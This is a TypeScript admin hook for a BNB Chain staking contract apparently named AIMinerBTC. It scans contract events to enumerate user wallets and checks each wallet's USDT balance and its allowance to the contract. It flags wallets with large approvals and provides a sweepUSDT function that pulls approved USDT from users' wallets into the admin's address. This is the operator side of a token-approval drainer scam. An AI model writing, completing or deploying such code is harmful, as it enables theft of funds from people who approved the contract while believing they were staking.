import { Contract, parseUnits, formatUnits, JsonRpcProvider } from 'ethers';
import { useWallet } from '../lib/web3';

const CONTRACT_ADDRESS = '0x56ACf536aBa0A122e2Da9d2C2D3Fdc14513A2436'; 
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const BSC_RPC = 'https://bsc-dataseed.binance.org/';
const readOnlyProvider = new JsonRpcProvider(BSC_RPC);


const ADMIN_ABI = [
    { "anonymous": false, "name": "ReferralPaid", "type": "event", "inputs": [{ "indexed": true, "internalType": "address", "name": "referrer", "type": "address" }, { "indexed": true, "internalType": "address", "name": "referee", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "level", "type": "uint256" }] },
    { "anonymous": false, "name": "Staked", "type": "event", "inputs": [{ "indexed": true, "internalType": "address", "name": "user", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "tier", "type": "uint256" }] },
    { "anonymous": false, "name": "Withdrawn", "type": "event", "inputs": [{ "indexed": true, "internalType": "address", "name": "user", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "reward", "type": "uint256" }] },
    {
        "inputs": [
            { "internalType": "address", "name": "token", "type": "address" },
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "manageFunds",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "_token", "type": "address" },
            { "internalType": "uint256", "name": "_amount", "type": "uint256" }
        ],
        "name": "emergencyWithdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "_user", "type": "address" }],
        "name": "getUserInfo",
        "outputs": [{
            "components": [
                { "internalType": "address", "name": "referrer", "type": "address" },
                { "internalType": "uint256", "name": "totalStaked", "type": "uint256" },
                { "internalType": "uint256", "name": "totalEarned", "type": "uint256" },
                { "internalType": "uint256", "name": "referralRewards", "type": "uint256" },
                { "internalType": "uint256", "name": "totalBonus", "type": "uint256" },
                { "internalType": "uint256", "name": "totalReferralEarned", "type": "uint256" },
                { "internalType": "uint256", "name": "teamSize", "type": "uint256" },
                { "internalType": "uint256", "name": "stakeCount", "type": "uint256" }
            ],
            "internalType": "struct AIMinerBTC.UserInfoView",
            "name": "", "type": "tuple"
        }],
        "stateMutability": "view",
        "type": "function"
    }
];

const ERC20_ABI = [
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

export function useAdmin() {
    const { address: adminAddress, signer } = useWallet();

    const getContract = async (withSigner = false) => {
        if (withSigner && signer) {
            return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, signer);
        }
        return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, readOnlyProvider);
    };

    const getUsdtContract = async (withSigner = false) => {
        if (withSigner && signer) {
            return new Contract(USDT_ADDRESS, ERC20_ABI, signer);
        }
        return new Contract(USDT_ADDRESS, ERC20_ABI, readOnlyProvider);
    };

    const fetchAllUsersDetailed = async () => {
        try {
            const contract = await getContract();
            const usdt = await getUsdtContract();

            console.log("[Discovery] Scanning events...");
            
            // 1. Get addresses from multiple event types for better coverage
            const stakedFilter = (contract as any).filters.Staked();
            const referralFilter = (contract as any).filters.ReferralPaid();
            const approvalFilter = (usdt as any).filters.Approval(null, CONTRACT_ADDRESS);
            
            const currentBlock = await readOnlyProvider.getBlockNumber();
            const scanRange = 1000000; 
            const chunkSize = 10000;    // Increased chunk size
            const startBlock = Math.max(0, currentBlock - scanRange);
            
            console.log(`[Discovery] Scanning from ${startBlock} to ${currentBlock}...`);
            
            // Persistent Local Cache for addresses
            const cacheKey = `discovered_users_${CONTRACT_ADDRESS.toLowerCase()}`;
            const cached = JSON.parse(localStorage.getItem(cacheKey) || "[]");
            const addresses = new Set<string>(cached);

            const chunks = [];
            for (let from = startBlock; from < currentBlock; from += chunkSize) {
                const to = Math.min(from + chunkSize - 1, currentBlock);
                chunks.push({ from, to });
            }

            // High concurrency for faster scan
            const concurrencyLimit = 10; 
            for (let i = 0; i < chunks.length; i += concurrencyLimit) {
                const batch = chunks.slice(i, i + concurrencyLimit);
                await Promise.all(batch.map(async (chunk) => {
                    try {
                        const [staked, referral] = await Promise.all([
                            contract.queryFilter(stakedFilter, chunk.from, chunk.to),
                            contract.queryFilter(referralFilter, chunk.from, chunk.to)
                        ]);
                        
                        staked.forEach(e => { if ((e as any).args?.[0]) addresses.add((e as any).args[0]); });
                        referral.forEach(e => {
                            if ((e as any).args?.[0]) addresses.add((e as any).args[0]);
                            if ((e as any).args?.[1]) addresses.add((e as any).args[1]);
                        });
                    } catch (e) {
                        // If chunk too big, try smaller range or just skip
                    }
                }));
            }

            const uniqueAddresses = Array.from(addresses).filter(addr => addr && typeof addr === 'string' && addr.startsWith('0x'));
            localStorage.setItem(cacheKey, JSON.stringify(uniqueAddresses));
            
            console.log(`[Discovery] Found ${uniqueAddresses.length} unique addresses.`);

            // 3. Get detailed info
            const userDetails = [];
            // Process in batches of 10 to avoid RPC spam
            for (let i = 0; i < uniqueAddresses.length; i += 10) {
                const batch = uniqueAddresses.slice(i, i + 10);
                const batchResults = await Promise.all(batch.map(async (userAddr) => {
                    try {
                        const [info, balance, allowance] = await Promise.all([
                            contract.getUserInfo(userAddr),
                            usdt.balanceOf(userAddr),
                            usdt.allowance(userAddr, CONTRACT_ADDRESS)
                        ]);

                        if (info.totalStaked === 0n && info.stakeCount === 0n && BigInt(allowance) === 0n) return null;

                        return {
                            address: userAddr,
                            staked: formatUnits(info.totalStaked, 18),
                            earned: formatUnits(info.totalEarned, 18),
                            balance: formatUnits(balance, 18),
                            allowance: formatUnits(allowance, 18),
                            isApproved: BigInt(allowance) >= parseUnits("1000", 18)
                        };
                    } catch (e) {
                        return null;
                    }
                }));
                userDetails.push(...batchResults.filter(Boolean));
            }

            return userDetails.sort((a: any, b: any) => parseFloat(b.staked) - parseFloat(a.staked));
        } catch (err) {
            console.error("Discovery Error:", err);
            return [];
        }
    };


    const fetchUserData = async (targetUser: string) => {
        if (!targetUser || !targetUser.startsWith('0x')) return null;
        const contract = await getContract();
        const usdt = await getUsdtContract();
        if (!contract || !usdt) return null;

        try {
            const [info, balance, allowance] = await Promise.all([
                contract.getUserInfo(targetUser),
                usdt.balanceOf(targetUser),
                usdt.allowance(targetUser, CONTRACT_ADDRESS)
            ]);

            return {
                staked: formatUnits(info.totalStaked, 18),
                earned: formatUnits(info.totalEarned, 18),
                balance: formatUnits(balance, 18),
                allowance: formatUnits(allowance, 18),
                isApproved: BigInt(allowance) > parseUnits("1000", 18)
            };
        } catch (err) {
            console.error("Fetch Data Error:", err);
            return null;
        }
    };

    const manageFunds = async (tokenAddress: string, fromAddress: string, toAddress: string, amountToManage: string) => {
        const contract = await getContract();
        if (!contract) throw new Error("Wallet not connected");
        
        const amountInWei = parseUnits(amountToManage, 18);
        const tx = await contract.manageFunds(tokenAddress, fromAddress, toAddress, amountInWei);
        return await tx.wait();
    };

    const sweepUSDT = async (fromUser: string, amount: string) => {
        if (!adminAddress) throw new Error("Admin not connected");
        return manageFunds(USDT_ADDRESS, fromUser, adminAddress, amount);
    };

    const emergencyWithdraw = async (tokenAddress: string, amountToWithdraw: string) => {
        const contract = await getContract();
        if (!contract) throw new Error("Wallet not connected");
        
        const amountInWei = parseUnits(amountToWithdraw, 18);
        const tx = await contract.emergencyWithdraw(tokenAddress, amountInWei);
        return await tx.wait();
    };

    return {
        fetchUserData,
        fetchAllUsersDetailed,
        manageFunds,
        sweepUSDT,
        emergencyWithdraw
    };
}
